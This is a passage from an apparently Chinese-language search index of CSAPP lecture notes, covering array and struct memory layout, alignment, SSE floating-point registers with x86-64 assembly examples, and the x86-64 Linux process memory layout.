\u662f\u6307\u9488\u6784\u6210\u7684\u6570\u7ec4\n\u6559\u6388\u8ba4\u4e3a\uff1a\u7a7a\u65b9\u62ec\u53f7 [] \u662f\u6307\u9488 * \u7684\u53e6\u4e00\u79cd\u8868\u793a\uff0c\u5373 A[] \u548c *A \u7b49\u4ef7\n\nComp: Compiles (Y/N), Bad: Possible bad pointer reference (Y/N), Size: Value returned by sizeof().\n</code></pre>"},{"location":"out_class_learning/freely_learning/CSAPP/L08-Machine-Level-Programming-IV-Data/#_5","title":"\u4e8c\u7ef4\u7b49\u591a\u7ef4\u6570\u7ec4","text":"<p>\u5bf9\u4e8e <code>T A[R][C]</code> \u8fd9\u6837\u4e00\u4e2a <code>R</code> \u884c <code>C</code> \u5217\uff0c\u5143\u7d20\u7c7b\u578b\u4e3a <code>T</code> \u7684\u4e8c\u7ef4\u6570\u7ec4\uff0c\u5047\u8bbe\u4e00\u4e2a <code>T</code> \u7c7b\u578b\u5143\u7d20\u9700\u8981 <code>K</code> \u5b57\u8282\uff0c\u5219\u6570\u7ec4\u5927\u5c0f\u4e3a <code>R * C * K</code> \u5b57\u8282\uff0c\u5176\u6392\u5e03\u5e94\u4e3a\u884c\u4f18\u5148\u5e8f\uff08row-major ordering\uff09\uff0c\u5373\u6309\u5982\u4e0b\u6392\u5e03\uff1a</p> <pre><code>A[0][0] ... A[0][C-1] A[1][0] ... A[1][C-1] ... A[R-1][0] ... A[R-1][C-1]\n</code></pre> <p>\u6211\u4eec\u4f5c\u8fd9\u6837\u7684\u7406\u89e3\uff1a<code>A[R][C]</code> \u5b9e\u9645\u4e0a\u662f <code>(A[R])[C]</code> \u5373\u957f\u5ea6\u4e3a <code>R</code> \u7684\u6570\u7ec4\uff0c\u6bcf\u4e2a\u5143\u7d20\u4e3a\u957f\u5ea6\u4e3a <code>C</code> \u7684\u6570\u7ec4\uff0c\u8fd9\u7c7b\u4f3c\u4e8e <code>(*p)[Z]</code>.</p> <p>\u5d4c\u5957\u6570\u7ec4\u7684\u4f8b\u5b50\uff1a</p> <pre><code>#define PCOUNT 4\nzip_dig pgh[PCOUNT] = // \u76f8\u5f53\u4e8e int pgh[4][5]\n  {{1, 5, 2, 0, 6}.\n   {1, 5, 2, 1, 3},\n   {1, 5, 2, 1, 7},\n   {1, 5, 2, 2, 1}}\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n|1|5|2|0|6|1|5|2|1|3|1|5|2|1|7|1|5|2|2|1|\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n76                                      156\n</code></pre> <p>\u5d4c\u5957\u6570\u7ec4\u5217\u8bbf\u95ee\uff1a\u884c\u5411\u91cf\uff1a</p> <p><code>T A[R][C]</code> \u4e2d <code>A[i]</code> \u662f <code>C</code> \u4e2a\u5143\u7d20\u7684\u6570\u7ec4\uff0c\u6bcf\u4e2a <code>T</code> \u7c7b\u578b\u5143\u7d20\u9700\u8981 <code>K</code> \u4e2a\u5b57\u8282\uff0c\u4e5f\u5c31\u662f\u8bf4 <code>A[i][j]</code> \u7684\u5730\u5740\u662f <code>A + (i * C + j) * K</code></p> <p>\u663e\u7136\u5176\u4e2d\u7684\u4e58\u6cd5\u8fc7\u591a\uff0c\u800c\u4e14\u56e0\u4e3a\u662f\u5e38\u6570\uff0c\u6240\u4ee5\u7f16\u8bd1\u5668\u5f80\u5f80\u4f1a\u505a\u81ea\u5df1\u7684\u5c0f\u5de7\u601d\uff0c\u6211\u4eec\u5f53\u7136\u53ef\u4ee5\u5229\u7528\u8fd9\u4e9b\u5c0f\u5de7\u601d\uff0c\u6bd4\u5982\u5c06\u6570\u7ec4\u957f\u5ea6\u8bbe\u5b9a\u4e3a\u4e8c\u7684\u5e42\uff0c\u8fd9\u6837\u6307\u4ee4\u66f4\u5c11\uff0c\u8fd0\u7b97\u4f1a\u66f4\u5feb\uff0c\u6bd4\u5982\u4e0b\u9762\u662f 16*16 \u7684\u77e9\u9635\uff08\u4f7f\u7528\u6570\u7ec4\u8868\u793a\uff09\uff0c\u6211\u4eec\u8bbf\u95ee\u4e4b\u7684\u4f8b\u5b50\uff1a</p> <pre><code>/* Get element a[i][j] */\nint fix_ele(fix_matrix a, size_t i, size_t j) {\n    return a[i][j];\n}\n</code></pre> <pre><code># a in %rdi, i in %rsi, j in %rdx\n    salq    $6, %rsi             # 64 * i  \n    addq    %rsi, %rdi           # a + 64 * i\n    movl    (%rdi,%rdx,4), %eax  # M[a + 64 * i + 4 * j]\n    ret \n</code></pre> <p>n * n \u77e9\u9635\u8bbf\u95ee\uff1a</p> <pre><code>/* Get element a[i][j] */\nint val_ele(size_t n, int a[n][n], size_t i, size_t j) {\n    return a[i][j];\n}\n</code></pre> <pre><code># n in %rdi, a in %rsi, i in %rdx, j in %rcx\n    imulq    %rdx, %rdi          # n * i\n    leaq     (%rsi,%rdi,4), %rax # a + 4 * n * i\n    movl     (%rax,%rcx,4), %eax # a + 4 * n * i + 4 * j\n    ret\n</code></pre>"},{"location":"out_class_learning/freely_learning/CSAPP/L08-Machine-Level-Programming-IV-Data/#_6","title":"\u591a\u7ea7\u6570\u7ec4","text":"<pre><code>#define ZLEN 5\ntypedef int zip_dig[ZLEN]\nzip_dig cmu = {1, 5, 2, 1, 3};\nzip_dig mit = {0, 2, 1, 3, 9};\nzip_dig ucb = {9, 4, 7, 2, 0};\n#define UCOUNT 3\nint *univ[UCOUNT] = {mit, cmu, ucb};\n</code></pre> <pre><code>     +-+-+-+-+-+\ncmu  |1|5|2|1|3| &lt;---+\n     +-+-+-+-+-+     |\n     16        36    |   univ\n     +-+-+-+-+-+   +-|-- 36 &lt;- 160\nmit  |0|2|1|3|9| &lt;-+ +-- 16 &lt;- 168\n     +-+-+-+-+-+      +- 56 &lt;- 176\n     36        56     |\n     +-+-+-+-+-+      |\ncmu  |1|5|2|1|3| &lt;----+\n     +-+-+-+-+-+\n     56        76\n</code></pre> <p>\u591a\u7ea7\u6570\u7ec4\u7684\u8bbf\u95ee</p> <pre><code>int get_univ_digit(size_t index, size_t digit) {\n    return univ[index][digit];\n}\n</code></pre> <pre><code>    salq    $2, %rsi            # 4 * digit\n    addq    univ(,%rdi,8), %rsi # p = univ[index] + 4 * digit\n    movl    (%rsi), %eax        # return *p\n    ret \n</code></pre> <p>1999 \u5e74\u53d1\u884c\u7684 C99 \u4ee5\u6765\uff0c\u4f60\u53ef\u4ee5\u5c06\u6570\u7ec4\u4f5c\u4e3a\u4e00\u4e2a\u53c2\u6570\u4f20\u9012\u3002</p>"},{"location":"out_class_learning/freely_learning/CSAPP/L08-Machine-Level-Programming-IV-Data/#_7","title":"\u7ed3\u6784\u4f53","text":"<pre><code>struct rec {\n    int a[4];\n    size_t i;\n    struct rec *next;\n}\n</code></pre> <pre><code>r\n|\nv\n+--------+----+----+\n|a       |i   |next|\n+--------+----+----+\n0        16   24   32\n</code></pre> <p>\u7ed3\u6784\u4f53\u88ab\u8868\u793a\u4e3a\u4e00\u5757\u5185\u5b58 Structure represented as block of memory </p> <p>\u200b   \u8db3\u591f\u5927\u80fd\u591f\u5305\u62ec\u6240\u6709\u5b57\u6bb5\uff08field\uff09 Big enough to hold all of the fields</p> <p>\u6bcf\u4e00\u5b57\u6bb5\u7684\u987a\u5e8f\u4e3a\u58f0\u660e\u987a\u5e8f Fields ordered according to declaration </p> <p>\u200b   \u5373\u4f7f\u53e6\u4e00\u79cd\u987a\u5e8f\u53ef\u4ee5\u4f7f\u7528\u66f4\u5c11\u7684\u7a7a\u95f4 Even if another ordering couyld yield a more compact representation</p> <p>\u7f16\u8bd1\u5668\u51b3\u5b9a\u4e86\u6574\u4f53\u7684\u5927\u5c0f\u548c\u5404\u5b57\u6bb5\u7684\u4f4d\u7f6e Compiler determines overall size + positions of fields</p> <p>\u200b   \u673a\u5668\u7ea7\u7a0b\u5e8f\u4e0d\u4f1a\u7406\u89e3\u6e90\u4ee3\u7801\u4e2d\u7684\u7ed3\u6784\u4f53 Machine-level program has no understanding of the structures in the source code </p> <pre><code>int *get_ap(struct rec *r, size_t idx) {\n    return &amp;r-&gt;a[idx];\n}\n</code></pre> <pre><code># r in %rdi, idx in %rsi\n    leaq    (%rdi,%rsi,4), %rax # r + 4 * idx\n    ret \n</code></pre> <pre><code>void set_val(struct rec *r, int val) {\n    while (r) {\n        size_t i = r-&gt;i;\n        r-&gt;a[i] = val;\n        r = r-&gt;next;\n    }\n}\n/*\n%rdi    r\n%rsi    val\n*/\n</code></pre> <pre><code>.L11:                           # loop:\n    movslq  16(%rdi), %rax      #   i = M[r+16]\n    movl    %esi, (%rdi,%rax,4) #   M[r+4*i] = val\n    movq    24(%rdi), %rdi      #   r = M[r+24]\n    testq   %rdi, %rdi          #   Test r\n    jne     .L11                #   if != 0 goto loop\n</code></pre> <p>\u7ed3\u6784\u4f53\u548c\u5bf9\u9f50</p> <pre><code>struct S1 {\n    char c;\n    int i[2];\n    double v;\n} *p;\n</code></pre> <p>\u672a\u5bf9\u9f50\u7684\u6570\u636e\uff1a</p> <pre><code>+-+----+----+--------+\n|c|i[0]|i[1]|v       |\n+-+----+----+--------+\np      p+5  p+9      p+17\n</code></pre> <p>\u5bf9\u9f50\u7684\u6570\u636e\uff1a</p> <pre><code>+----+----+--------+--------+\n|c\\3B|i[0]|i[1]\\4B |v       |\n+----+----+--------+--------+\np    p+4  p+8      p+16     p+32\n\u53ef\u4ee5\u770b\u5230\u5176\u4e2d\u6709 3Bytes \u548c 4 Bytes \u7684\u7a7a\u767d\u5b57\u8282\uff0c\u53ea\u662f\u4e3a\u4e86\u5bf9\u9f50\n\u539f\u59cb\u6570\u636e\u9700\u8981 K \u5b57\u8282\uff0c\u90a3\u4e48\u5730\u5740\u5fc5\u987b\u662f K \u7684\u500d\u6570 Primitive data type requires K bytes. Address must be multiple of K.\n\u5177\u4f53\u6765\u8bf4\uff0cc \u7684\u76f8\u5bf9\u5730\u5740\u662f 0\uff0c\u662f 1 \u7684\u500d\u6570\uff1bi[0] \u548c i[1] \u7684\u76f8\u5bf9\u5730\u5740\u662f 4 \u548c 8\uff0c\u662f 4 \u7684\u500d\u6570\uff0cv \u7684\u76f8\u5bf9\u5730\u5740\u662f 16\uff0c\u662f 8 \u7684\u500d\u6570.\n</code></pre> <p>\u5bf9\u9f50\u7684\u5f15\u5165\u662f\u4e3a\u4e86\u786c\u4ef6\u8fd0\u884c\uff1a\u5b9e\u9645\u7684\u5185\u5b58\u7cfb\u7edf\u4e00\u6b21\u4e0d\u53d6\u4e00\u4e2a\u5b57\u8282\uff0c\u73b0\u5728\u7684\u5927\u591a\u6570\u673a\u5668\u4e00\u6b21\u5927\u7ea6\u53d6 64 \u5b57\u8282\u2014\u2014\u8fd9\u53d6\u51b3\u4e8e\u786c\u4ef6\u4e2d\u7684\u5404\u79cd\u5bbd\u5ea6\uff08various widths\uff09\uff0c\u5982\u679c\u6ca1\u6709\u4e00\u4e2a\u5bf9\u9f50\u7684\u5730\u5740\u4f7f\u5f97\u4e00\u4e2a\u6570\u636e\u8de8\u8d8a\u4e86\u4e24\u4e2a\u5757\u4e4b\u95f4\u7684\u8fb9\u754c\uff0c\u5c06\u4f1a\u5bfc\u81f4\u786c\u4ef6\u751a\u81f3\u64cd\u4f5c\u7cfb\u7edf\u6765\u91c7\u53d6\u4e00\u4e9b\u989d\u5916\u7684\u6b65\u9aa4\u6765\u5904\u7406\uff0c\u4f7f\u5f97\u8fd0\u884c\u6548\u7387\u53d7\u5230\u5f88\u5927\u5f71\u54cd\uff0c\u5bf9\u9f50\u539f\u5219\u8fd9\u4e00\u539f\u5219\u7531\u6b64\u786e\u7acb\u3002</p> <p>\u5bf9\u9f50\u539f\u5219 Alignment Principles</p> <p>\u200b   \u5bf9\u9f50\u6570\u636e Aligned Data</p> <p>\u200b       \u539f\u59cb\u6570\u636e\u9700\u8981 K \u5b57\u8282 Primitive data type requires K bytes</p> <p>\u200b       \u5730\u5740\u5fc5\u987b\u662f K \u7684\u500d\u6570 Address must be multiple of K</p> <p>\u200b       \u8fd9\u88ab\u67d0\u4e9b\u673a\u5668\u8981\u6c42\uff0c\u88ab x86-64 \u5efa\u8bae Required on some machines; advised on x86-64 \u3010\u5728\u8fd9\u6837\u7684\u67d0\u4e9b\u673a\u5668\u4e0a\u4f1a\u5bfc\u81f4\u5185\u5b58\u9519\u8bef\uff08memory fault\uff09\u3011</p> <p>\u200b   \u5bf9\u9f50\u6570\u636e\u7684\u52a8\u673a Motivation for Aligned Data</p> <p>\u200b       \u5185\u5b58\u88ab\uff08\u5bf9\u9f50\u7684\uff094 \u6216 8 \u5b57\u8282\u7684\u5757\u8bbf\u95ee\uff08\u7cfb\u7edf\u4f9d\u8d56\uff09Memory accessed by (aligned) chunks of 4 or 8 bytes (system-dependent)</p> <p>\u200b           \u4e0d\u5145\u5206\u52a0\u8f7d\u548c\u5b58\u50a8\u6570\u636e\uff0c\u4f1a\u5f62\u6210 4 \u5b57\u8282\u8fb9\u754c Inefficient to load or store datum that spans quad word boundaries</p> <p>\u200b           \u5f53\u6570\u636e\u88ab\u8fb9\u754c\u5207\u5f00\u4f1a\u4f7f\u5f97\u865a\u62df\u5185\u5b58\u66f4\u96be\u4ee5\u5904\u7406 Virtual memory tricker when datum spans 2 pages</p> <p>\u200b   \u7f16\u8bd1\u5668 Compiler</p> <p>\u200b       \u5728\u7ed3\u6784\u4f53\u5404\u5b57\u6bb5\u95f4\u63d2\u5165\u95f4\u9699\u4ee5\u5bf9\u9f50 Inserts gaps in structure to ensure correct alignment of fields</p> <p>\u5728\u7ed3\u6784\u4f53\u4e0a\u6ee1\u8db3\u5bf9\u9f50\u539f\u5219 satisfying alignment with structures</p> <p>\u200b   \u7ed3\u6784\u4f53\u5185 Within structure:</p> <p>\u200b       \u5fc5\u987b\u6ee1\u8db3\u6bcf\u4e2a\u5143\u7d20\u7684\u5bf9\u9f50\u9700\u6c42 Must satisfy each element's alignment requirement</p> <p>\u200b   \u7ed3\u6784\u4f53\u6574\u4f53 Overall structure placement</p> <p>\u200b       \u6bcf\u4e2a\u7ed3\u6784\u4f53\u5fc5\u987b\u5bf9\u9f50 K Each structure has alignment requirement K</p> <p>\u200b           \u6b64\u5904 K \u662f\u7ed3\u6784\u4f53\u5185\u6700\u5927\u5143\u7d20\u7684\u5bf9\u9f50\u8981\u6c42 K = Largest alignment of any element</p> <p>\u200b       \u521d\u59cb\u5730\u5740\u548c\u7ed3\u6784\u4f53\u957f\u5ea6\u5fc5\u987b\u662f K \u7684\u500d\u6570 Initial address &amp; structure length must be multiples of K</p> <p>\u53e6\u4e00\u4f8b\u5b50\uff1a</p> <pre><code>struct S2 {\n    double v;\n    int i[2];\n    char c;\n} *p;\n</code></pre> <pre><code>+--------+----+----+--------+\n|v       |i[0]|i[1]|c\\7B    |\n+--------+----+----+--------+\np        p+8  p+12 p+16     p+24\n</code></pre> <pre><code>struct S2 {\n    double v;\n    int i[2];\n    char c;\n} a[10]\n</code></pre> <pre><code>+------------------------+------------------------+-----\n|a[0]                    |a[1]                    | ...\n+------------------------+------------------------+-----\na+0                      a+24                     a+48\n</code></pre> <pre><code>struct S3 {\n    short i;\n    float v;\n    short j;\n} a[10];\n</code></pre> <pre><code>+------------+------------+-----\n|a[0]        |a[1]        | ...\n+------------+------------+-----\na+0          a+12         a+24\n\n+----+----+----+\n|i \\2Bv   |j \\2B\n+----+----+--+-+ &lt;- a+12*idx+12\na+12*idx  a+12*idx+8       \n</code></pre> <pre><code>short get_j(int idx) {\n    return a[idx].j;\n}\n</code></pre> <pre><code># %rdi = idx\n    leaq (%rdi,%rdi,2), %rax   # 3 * idx\n    movzwl a+8(,%rax,4), %eax  # \u8fd9\u91cc\u6ca1\u6709\u5199\u51fa\u5b58\u50a8 a \u5730\u5740\u7684\u5bc4\u5b58\u5668\n</code></pre> <p>\u9700\u8981\u624b\u52a8\u4f18\u5316\uff1a\u5c06\u5927\u7684\u6570\u636e\u7c7b\u578b\u653e\u5728\u524d\u9762\uff1a\uff08\u8d2a\u5fc3\u7b97\u6cd5\uff08greedy algorithm\uff09\u4fdd\u8bc1\u4e86\u8fd9\u4f1a\u6700\u5c0f\u5316\u5360\u636e\u7684\u7a7a\u95f4\uff09</p> <pre><code>struct S4 {\n    char c;\n    int i;\n    char d;\n} *p // \u9700\u8981 12 \u5b57\u8282 \u7a7a\u95f4\uff1ac + 3 + i + d + 3\nstruct S5 {\n    int i;\n    char c;\n    char d;\n} *p // \u9700\u8981 8 \u5b57\u8282\u7a7a\u95f4\uff1ai + c + d + 2\n</code></pre>"},{"location":"out_class_learning/freely_learning/CSAPP/L08-Machine-Level-Programming-IV-Data/#floating-point","title":"\u6d6e\u70b9\u6570\uff08Floating Point\uff09","text":"<p>\u80cc\u666f Background</p> <p>\u200b   \u5386\u53f2 History</p> <p>\u200b       x87 FP</p> <p>\u200b           \u9057\u4ea7\uff0c\u76f8\u5f53\u4e11\u964b Legacy, very ugly</p> <p>\u200b       SSE FP</p> <p>\u200b           \u9ca8\u9c7c\u673a\u652f\u6301 supported by Shark machine \u3010\u9ca8\u9c7c\u673a\u662f CMU \u7684\u8bfe\u7a0b\u5b9e\u9a8c\u673a\u5668\u3011</p> <p>\u200b           \u5728 vector \u6307\u4ee4\u4f7f\u7528\u65f6\u7684\u7279\u6b8a\u60c5\u51b5 Special case use of vector instructions</p> <p>\u200b       AVX FP</p> <p>\u200b           \u6700\u65b0\u7248\u672c Newest version</p> <p>\u200b           \u548c SSE \u76f8\u8fd1 Similar to SSE</p> <p>\u200b           \u4e66\u4e2d\u8bb0\u8f7d\u7684\u7248\u672c  Documented in book</p> <p>\u4ee5\u524d\uff0c8086 \u5904\u7406\u5668\u4e0a\u6709\u4e00\u5757\u79f0\u4e3a 8087 \u7684\u82af\u7247\uff0c\u80fd\u591f\u5b8c\u6210\u6240\u6709\u6240\u9700\u7684\u786c\u4ef6\u4ee5\u5728\u5355\u4e2a\u82af\u7247\u4e0a\u5b9e\u73b0\u5b8c\u6574\u7684 IEEE \u6d6e\u70b9\u6570\u5728\u5de5\u7a0b\u4e0a\u582a\u79f0\u6770\u4f5c\uff0c\u7136\u800c\u8fd9\u7f16\u7a0b\u6a21\u578b\u975e\u5e38\u4e11\u964b\u3001\u7cdf\u7cd5\u3002\u7531\u4e8e\u6d6e\u70b9\u6570\u7684\u5b9e\u7528\u6027\uff0c\u8feb\u5207\u9700\u8981\u4e00\u79cd\u65b0\u7684\u9ad8\u6548\u7684\u5b9e\u73b0\u5176\u8fd0\u7b97\u7684\u786c\u4ef6\u5b9e\u73b0\uff0c\u7531\u6b64\u8bde\u751f\u4e86 SSE\uff0c\u5b83\u66ff SIMD \u6267\u884c SIMD \u8981\u6267\u884c\u7684\u90e8\u5206\u6307\u4ee4\u3002\u968f\u540e\u5de5\u7a0b\u5e08\u4eec\u53c8\u63d0\u70bc SSE \u4e2d\u7684\u7cbe\u534e\uff0c\u6784\u5efa\u4e86 AVX.</p> <p>SSE3\uff1aXMM Registers \u603b\u5171\u6709 16 \u4e2a\u7279\u6b8a\u7684\u5bc4\u5b58\u5668\uff0c\u6bcf\u4e2a\u90fd\u6709 16 \u4e2a\u5b57\u8282\u3002\u6bcf\u4e2a\u5bc4\u5b58\u5668\u6709\u5982\u4e0b\u65b9\u5f0f\u5904\u7406\uff1a</p> <ul> <li>\u5b58\u50a8 16 \u4e2a\u5355\u5b57\u8282\u6574\u578b\u3002</li> <li>\u5b58\u50a8 8 \u4e2a 16 \u6bd4\u7279\u6574\u578b\u3002</li> <li>\u5b58\u50a8 4 \u4e2a 32 \u6bd4\u7279\u6574\u578b\u3002</li> <li>\u5b58\u50a8 4 \u4e2a\u5355\u7cbe\u5ea6\u6d6e\u70b9\u578b\u3002</li> <li>\u5b58\u50a8 2 \u4e2a\u53cc\u7cbe\u5ea6\u6d6e\u70b9\u578b\u3002</li> <li>\u5b58\u50a8 1 \u4e2a\u5355\u7cbe\u5ea6\u6d6e\u70b9\u578b\uff0c\u5176\u4f59\u7a7a\u95f4\u968f\u610f\u3002</li> <li>\u5b58\u50a8 1 \u4e2a\u53cc\u7cbe\u5ea6\u6d6e\u70b9\u578b\uff0c\u5176\u4f59\u7a7a\u95f4\u968f\u610f\u3002</li> </ul> <p>\u6807\u91cf\u548c\u5355\u6307\u4ee4\u591a\u6570\u636e\u64cd\u4f5c Scalar &amp; SIMD Operations\u3010\u5355\u6307\u4ee4\u591a\u6570\u636e\uff1aSIMD, single instruction multiple data\u3011</p> <pre><code>addss %xmm0, %xmm1 # add scalar single \u4e24\u4e2a \u5355\u7cbe\u5ea6/4\u5b57\u8282 \u6807\u91cf\u76f8\u52a0\uff08\u6807\u91cf\u6307\u4ee4\uff09\naddps %xmm0, %xmm1 # add pack single **\u516b**\u4e2a \u5355\u7cbe\u5ea6/4\u5b57\u8282\u6807\u91cf **\u5206\u522b** \u76f8\u52a0\uff08SIMD \u6307\u4ee4\uff09\naddsd %xmm0, %xmm1 # add scalar double \u4e24\u4e2a \u53cc\u7cbe\u5ea6/8\u5b57\u8282 \u6807\u91cf\u76f8\u52a0\uff08\u6807\u91cf\u6307\u4ee4\uff09\n</code></pre> <p>SIMD \u6307\u4ee4\u662f\u7cbe\u534e\uff1a\u4e00\u4e2a\u5bc4\u5b58\u5668\u5b58\u50a8\u4e00\u7ec4\u6570\u636e\uff0c\u4e00\u6761\u6307\u4ee4\u6267\u884c\u4e00\u7ec4\u52a0\u6cd5</p> <p>\u6d6e\u70b9\u6570\u5185\u5b58\u5f15\u7528 FP Memory Referencing</p> <p>\u200b   \u6574\u578b\uff08\u548c\u6307\u9488\uff09\u53c2\u6570\u7528\u5e38\u89c4\u5bc4\u5b58\u5668\u4f20\u9012 Integers (and pointer) arguments passed in regular registers</p> <p>\u200b   \u6d6e\u70b9\u578b\u4f7f\u7528 XMM \u5bc4\u5b58\u5668\u4f20\u9012 FP values passed in XMM registers</p> <p>\u200b   \u4e0d\u540c\u7684 <code>mov</code> \u6307\u4ee4\u6765\u79fb\u52a8 XMM \u5bc4\u5b58\u5668\u4e2d\u7684\u503c\u4ee5\u53ca XMM \u5bc4\u5b58\u5668\u548c\u5185\u5b58\u4e2d\u7684\u503c Different <code>mov</code> instructions to move between XMM registers, and between memory and XMM registers</p> <pre><code>double dincr(double *p, double v) {\n    double x = *p;\n    *p = x + v;\n    return x;\n}\n</code></pre> <pre><code># p in %rdi, v in %xmm0\n    movapd  %xmm0, %xmm1  # copy v\n    movsd   (%rdi), %xmm0 # x = *p\n    addsd   %xmm0, %xmm1  # t = x + v\n    movsd   %xmm1, (%rdi) # *p = t\n    ret \n</code></pre> <p>\u3010\u73b0\u5728\u597d\u50cf\u8fdb\u5316\u5230\u4f7f\u7528 YMM \u5bc4\u5b58\u5668\u4e86\uff0c\u53cd\u6b63\u6d6e\u70b9\u6570\u673a\u5236\u540e\u9762\u600e\u4e48\u53d1\u5c55\u7684\u4e5f\u6ca1\u8bb2\uff0c\u8fd9\u6bd5\u7adf\u662f 15 \u5e74\u7684\u8bfe\u7a0b\u3011</p> <p>\u5176\u4ed6\u6d6e\u70b9\u6570\u4ee3\u7801\u76f8\u5173 Other Aspects of FP code</p> <p>\u200b   \u5927\u91cf\u6307\u4ee4 Lots of instructions</p> <p>\u200b       \u4e0d\u540c\u7684\u6307\u4ee4\uff0c\u4e0d\u540c\u7684\u683c\u5f0f\u2026\u2026 Different operations, different formats </p> <p>\u200b   \u6d6e\u70b9\u6570\u6bd4\u8f83 Floating-point comparisons</p> <p>\u200b       <code>ucomiss</code> \u548c <code>ucomisd</code> \u6307\u4ee4 Instructions <code>ucomiss</code> and <code>ucomisd</code> </p> <p>\u200b       \u8bbe\u7f6e\u5982 CF\u3001ZF\u3001PF \u6761\u4ef6\u7801 Set conditions codes CF, ZF and PF</p> <p>\u200b   \u4f7f\u7528\u5e38\u6570\u503c Using constant values</p> <p>\u200b       \u7528 <code>xorpd %xmm0, %xmm0</code> \u6307\u4ee4\u6765\u8bbe\u7f6e XMM0 \u5bc4\u5b58\u5668\u4e3a 0 Set XMM0 register to 0 with instruction <code>xorpd %xmm0, %xmm0</code></p> <p>\u200b       \u5176\u4ed6\u4ece\u5185\u5b58\u53d6\u503c Others loaded from memory</p>"},{"location":"out_class_learning/freely_learning/CSAPP/L09-Machine-Level-Programming-V-Advanced-Topics/","title":"L09 Machine-Level Programming V: Advanced Topics","text":"<p>Source: https://www.bilibili.com/video/BV1iW411d7hd?p=9</p> <p>Today</p> <p>\u200b   \u5185\u5b58\u5b89\u6392 Memory Layout</p> <p>\u200b   \u7f13\u51b2\u533a\u6ea2\u51fa Buffer Overflow</p> <p>\u200b       \u6f0f\u6d1e Vulnerability</p> <p>\u200b       \u9632\u62a4 Protection</p> <p>\u200b   \u8054\u5408\u4f53 Unions\u3010\u8fd9\u662f\u4e00\u79cd\u6570\u636e\u7ed3\u6784\u3011</p>"},{"location":"out_class_learning/freely_learning/CSAPP/L09-Machine-Level-Programming-V-Advanced-Topics/#x86-64-linux","title":"x86-64 Linux \u5185\u5b58\u5b89\u6392","text":"<pre><code>--------------------- \\  &lt;- 0000 7FFF FFFF FFFF \u7531\u4e8e\u786c\u4ef6\u9650\u5236\uff0c\u5185\u5b58\u4ec5\u4f7f\u7528 47 \u4f4d(128TB)\u800c\u975e 64 \u4f4d\n|       Stack       |  \\\n---------------------   \\\n|         |         |    8MB \u6b64\u4e3a\u5e38\u7528\u673a\u5668\u7684\u8bbe\u7f6e\uff0c\u4f60\u53ef\u4ee5\u4f7f\u7528 limit \u547d\u4ee4\u67e5\u770b\u5f97\u5230  stacksize \u8fd9\u4e00\u6570\u636e\n|         v         |   /\n|                   |  /\n--------------------- /\n|                   |\n|                   |\n|                   |\n---------------------\n|  Shared Libraries |\n---------------------\n|                   |\n|         ^         |\n|         |         |\n---------------------\n|                   |       \n|       Heap        |\n|                   |\n---------------------\n|       Data        |\n---------------------\n|       Text        |\n--------------------- &lt;- Hex address 0000 4000 0000 0000\n|                   | \n--------------------- &lt;- Hex address 0000 0000 0000 0000\n</code></pre> <p>\u6808 Stack</p> <p>\u200b   Runtime stack (8MB limit)</p> <p>\u200b   \u4f8b\u5982\u672c\u5730\u53d8\u91cf e. g. local variables</p> <p>\u5806 Heap\u3010\u8fd9\u90e8\u5206\u7528\u4e8e\u5b58\u653e\u6240\u6709\u56e0 <code>malloc()</code> \u6216\u5176\u76f8\u5173\u51fd\u6570\u7533\u8bf7\u7684\u53d8\u91cf\u3011</p> <p>\u200b   Dynamically allocated as needed</p> <p>\u200b   When call <code>malloc()</code>, <code>calloc()</code>, <code>new()</code></p> <p>\u6570\u636e\u533a Data \u3010\u8fd9\u90e8\u5206\u5b58\u653e\u4e86\u6240\u6709\u7684\u5168\u5c40\u53d8\u91cf\u3011</p> <p>\u200b   \uff08\u5b58\u50a8\uff09\u9759\u6001\u5206\u914d\u6570\u636e Statically allocated data</p> <p>\u200b   \u4f8b\u5982\u5168\u5c40\u53d8\u91cf\u3001\u9759\u6001\u53d8\u91cf\u3001\u5b57\u7b26\u4e32\u5e38\u91cf e.g. global vars, <code>static</code> vars, string constants</p> <p>\u6587\u672c\u6bb5 Text / Shared Libraries \u3010\u6587\u672c\u6bb5\u7528\u4e8e\u5b58\u653e\u53ef\u6267\u884c\u7a0b\u5e8f\u3011\u3010SL \u7528\u4e8e\u5b58\u653e\u5e93\u51fd\u6570\u5bf9\u5e94\u7684\u53ef\u6267\u884c\u7a0b\u5e8f\uff0c\u52a8\u6001\u52a0\u8f7d\u3011</p> <p>\u200b   \uff08\u5b58\u50a8\uff09\u53ef\u6267\u884c\u673a\u5668\u6307\u4ee4 Executable machine instructions</p> <p>\u200b   \u53ea\u8bfb Read-only</p> <p>\u4f8b\u5b50\u5982\u4e0b\uff1a</p> <pre><code>char big_array[1L&lt;&lt;24];       /*  16 MB */ // -&gt; 0000 0000 8060 1060 Data\nchar huge_array[1L&lt;&lt;31];      /*   2 GB */ // -&gt; 0000 0000 0060 1060 Data\n\nint global = 0;\n\nint useless() { return 0; }                // -&gt; 0000 0000 0040 0590 Text\n\nint main() {                               // -&gt; 0000 0000 0040 060c Text\n    void *p1, *p2, *p3, *p4;\n    int local = 0;                         // -&gt; 0000 7ffe 4d3b e87c Stack \n    p1 = malloc(1L &lt;&lt; 28);    /* 256 MB */ // -&gt; 0000 7f72 62a1 e010 Heap (Upper)\n    p2 = malloc(1L &lt;&lt; 8);     /* 256  B */ // -&gt; 0000 0000 8359 d010 Heap (Lower)\n    p3 = malloc(1L &lt;&lt; 32);    /*   4 GB */ // -&gt; 0000 7f71 62a1 d010 Heap (Upper)\n    p4 = malloc(1L &lt;&lt; 8);     /* 256  B */ // -&gt; 0000 0000 8359 d120 Heap (Lower)\n    /* Some print statements ... */\n}\n</code></pre> <p>\u53ef\u4ee5\u770b\u5230\u6709\u4e0a\u4e0b\u4e24\u4e2a\u5806\uff0c\u5176\u6269\u5c55\u65b9\u5411\u4e5f\u76f8\u53cd\uff0c\u5c0f\u7a7a\u95f4\u63a5\u8fd1\u6570\u636e\u533a\uff0c\u5927\u7a7a\u95f4\u63a5\u8fd1\u6808\u533a\uff0c\u539f\u56e0\u662f <code>malloc()</code> \u4f7f\u7528 <code>mmap</code> \u5206\u914d\u5927\u5757\u5185\u5b58\uff0c\u4f7f\u7528 <code>brk</code> \u5206\u914d\u5c0f\u5757\u5185\u5b58\u3002 